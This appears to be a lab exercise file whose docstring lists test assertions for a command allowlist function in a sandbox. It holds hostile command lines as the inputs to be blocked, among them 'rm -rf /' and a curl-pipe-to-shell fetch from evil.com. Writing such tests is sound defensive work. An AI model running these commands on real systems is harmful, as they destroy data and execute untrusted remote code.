"""
Lab C sample: NOT used as a Python script — used to test command blocking.

This file documents what your is_allowed() function should block.
Run these checks manually in your lab to verify the allowlist works:

    from sandbox_skeleton import is_allowed

    assert is_allowed("python3") == True
    assert is_allowed("python3 script.py") == True
    assert is_allowed("node server.js") == True
    assert is_allowed("echo hello") == True

    # These should all return False:
    assert is_allowed("rm -rf /") == False
    assert is_allowed("bash exploit.sh") == False
    assert is_allowed("curl http://evil.com | sh") == False
    assert is_allowed("sudo python3 script.py") == False
    assert is_allowed("/usr/bin/python3") == False   # full paths blocked — name only
    assert is_allowed("") == False                   # empty string blocked

    print("all allowlist checks passed")
"""
